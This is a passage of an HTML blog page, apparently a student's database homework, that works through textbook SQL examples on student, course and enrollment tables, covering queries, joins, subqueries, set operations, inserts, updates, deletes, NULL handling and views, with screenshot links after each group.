class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 34</span></span><br><span class="line"><span class="keyword">SELECT</span> Cno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\ &#x27;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 35</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_%i__&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\ &#x27;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 36</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 37</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 38</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 39</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, Grade</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Grade <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 40</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sdept, Sage <span class="keyword">DESC</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 41</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 42</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> Sno)</span><br><span class="line"><span class="keyword">FROM</span> SC;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 43</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 44</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 45</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(Ccredit)</span><br><span class="line"><span class="keyword">FROM</span> SC,Course</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;201215012&#x27;</span> <span class="keyword">AND</span> SC.Cno<span class="operator">=</span>Course.Cno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 46</span></span><br><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">COUNT</span>(Sno)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 47</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>)<span class="operator">&gt;</span><span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 48</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, <span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Grade)<span class="operator">&gt;=</span><span class="number">90</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/16.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/17.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/18.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/19.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/20.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/21.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/22.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/23.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/24.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/25.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/26.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/27.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/28.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/29.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/30.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/31.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/32.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/33.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/34.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/35.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/36.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/37.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/38.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/39.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/40.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/41.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/42.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/43.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/44.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/45.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/46.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/47.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/48.png"></p><h3 id="连接查询-例3-49-3-54"><a href="#连接查询-例3-49-3-54" class="headerlink" title="连接查询(例3.49-3.54)"></a>连接查询(例3.49-3.54)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 49</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.<span class="operator">*</span>, SC.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student, SC</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 50</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line"><span class="keyword">FROM</span> Student,SC</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 51</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno, Sname</span><br><span class="line"><span class="keyword">FROM</span> Student, SC</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>SC.Sno <span class="keyword">AND</span></span><br><span class="line">SC.Cno<span class="operator">=</span><span class="string">&#x27;2&#x27;</span> <span class="keyword">AND</span> SC.Grade<span class="operator">&gt;</span><span class="number">90</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 52</span></span><br><span class="line"><span class="keyword">SELECT</span> FIRST.Cno, SECOND.Cpno</span><br><span class="line"><span class="keyword">FROM</span> Course <span class="keyword">FIRST</span>, Course <span class="keyword">SECOND</span></span><br><span class="line"><span class="keyword">WHERE</span> FIRST.Cpno <span class="operator">=</span> SECOND.Cno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 53</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade</span><br><span class="line"><span class="keyword">FROM</span> Student <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> SC <span class="keyword">ON</span></span><br><span class="line">(Student.Sno<span class="operator">=</span>SC.Sno);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 54</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno, Sname, Cname, Grade</span><br><span class="line"><span class="keyword">FROM</span> Student, SC, Course</span><br><span class="line"><span class="keyword">WHERE</span> Student.Sno <span class="operator">=</span> SC.Sno</span><br><span class="line"><span class="keyword">AND</span> SC.Cno <span class="operator">=</span> Course.Cno;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/49.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/50.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/51.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/52.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/53.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/54.png"></p><h3 id="嵌套查询-例3-55-3-63"><a href="#嵌套查询-例3-55-3-63" class="headerlink" title="嵌套查询(例3.55-3.63)"></a>嵌套查询(例3.55-3.63)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 55</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, Sname, Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘晨&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 56</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Cno</span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cname<span class="operator">=</span> <span class="string">&#x27;信息系统&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 57</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span> SC x</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="operator">&gt;=</span> (<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC y</span><br><span class="line"><span class="keyword">WHERE</span> y.Sno<span class="operator">=</span>x.Sno);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 58</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="keyword">ANY</span> (<span class="keyword">SELECT</span> Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>)</span><br><span class="line"><span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27;CS&#x27;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 59</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage <span class="operator">&lt;</span> <span class="keyword">ALL</span> (<span class="keyword">SELECT</span> Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27; CS &#x27;</span>)</span><br><span class="line"><span class="keyword">AND</span> Sdept <span class="operator">&lt;&gt;</span> <span class="string">&#x27; CS &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 60</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno <span class="keyword">AND</span> Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 61</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno <span class="keyword">AND</span> Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 62</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> Student.Sno</span><br><span class="line"><span class="keyword">AND</span> Cno<span class="operator">=</span> Course.Cno));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 63</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC SCX</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SC SCY</span><br><span class="line"><span class="keyword">WHERE</span> SCY.Sno <span class="operator">=</span> <span class="string">&#x27;201215122&#x27;</span> <span class="keyword">AND</span></span><br><span class="line"><span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SC SCZ</span><br><span class="line"><span class="keyword">WHERE</span> SCZ.Sno<span class="operator">=</span>SCX.Sno <span class="keyword">AND</span></span><br><span class="line">SCZ.Cno<span class="operator">=</span>SCY.Cno));</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/55.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/55.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/57.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/58.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/59.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/60.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/61.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/62.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/63.png"></p><h3 id="集合查询-例3-64-3-68"><a href="#集合查询-例3-64-3-68" class="headerlink" title="集合查询(例3.64-3.68)"></a>集合查询(例3.64-3.68)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 64</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 65</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 66</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">AND</span> Sage<span class="operator">&lt;=</span><span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 67</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 68</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">AND</span> Sage<span class="operator">&gt;</span><span class="number">19</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/64.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/65.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/66.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/67.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/68.png"></p><h2 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h2><h3 id="插入-例3-69-3-72"><a href="#插入-例3-69-3-72" class="headerlink" title="插入(例3.69-3.72)"></a>插入(例3.69-3.72)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 69</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Student (Sno,Sname,Ssex,Sdept,Sage)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;201215128&#x27;</span>,<span class="string">&#x27;陈冬&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;IS&#x27;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 70</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Student</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;201215126&#x27;</span>,<span class="string">&#x27;张成民&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;CS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 71</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC(Sno,Cno)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;201215128 &#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 72</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Dept_age</span><br><span class="line">(Sdept<span class="type">CHAR</span>(<span class="number">15</span>),</span><br><span class="line">Avg_age<span class="type">SMALLINT</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Dept_age(Sdept,Avg_age)</span><br><span class="line"><span class="keyword">SELECT</span> Sdept,<span class="built_in">AVG</span>(Sage)</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sdept;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/69.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/70.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/71.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/72.png"></p><h3 id="修改-例3-73-3-75"><a href="#修改-例3-73-3-75" class="headerlink" title="修改(例3.73-3.75)"></a>修改(例3.73-3.75)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 73</span></span><br><span class="line"><span class="keyword">UPDATE</span> Student</span><br><span class="line"><span class="keyword">SET</span> Sage<span class="operator">=</span><span class="number">22</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;201215121&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 74</span></span><br><span class="line"><span class="keyword">UPDATE</span> Student</span><br><span class="line"><span class="keyword">SET</span> Sage<span class="operator">=</span> Sage<span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 75</span></span><br><span class="line"><span class="keyword">UPDATE</span> SC</span><br><span class="line"><span class="keyword">SET</span> Grade<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span> );</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/73-74.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/75.png"></p><h3 id="删除-例3-76-3-78"><a href="#删除-例3-76-3-78" class="headerlink" title="删除(例3.76-3.78)"></a>删除(例3.76-3.78)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 76</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;201215128&#x27;</span>;</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;201215128&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 77</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> SC;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 78</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/76.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/77.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/78.png"></p><h2 id="空值的处理-例3-79-3-83"><a href="#空值的处理-例3-79-3-83" class="headerlink" title="空值的处理(例3.79-3.83)"></a>空值的处理(例3.79-3.83)</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 79</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC(Sno,Cno)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;201215126&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 80</span></span><br><span class="line"><span class="keyword">UPDATE</span> Student</span><br><span class="line"><span class="keyword">SET</span> Sdept <span class="operator">=</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;201215200&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 81</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">OR</span> Ssex <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">OR</span> Sage <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">OR</span> Sdept <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 82</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="operator">&lt;</span> <span class="number">60</span> <span class="keyword">AND</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 83</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> (Grade<span class="operator">&lt;</span><span class="number">60</span> <span class="keyword">OR</span> Grade <span class="keyword">IS</span> <span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/79.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/80.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/81.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/82.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/83.png"></p><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="定义视图-例3-84-3-91"><a href="#定义视图-例3-84-3-91" class="headerlink" title="定义视图(例3.84-3.91)"></a>定义视图(例3.84-3.91)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 84</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 85</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 86</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S1(Sno,Sname,Grade)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Grade</span><br><span class="line"><span class="keyword">FROM</span> Student,SC</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span> <span class="keyword">AND</span></span><br><span class="line">Student.Sno<span class="operator">=</span>SC.Sno <span class="keyword">AND</span></span><br><span class="line">SC.Cno<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 87</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> IS_S2</span><br><span class="line"><span 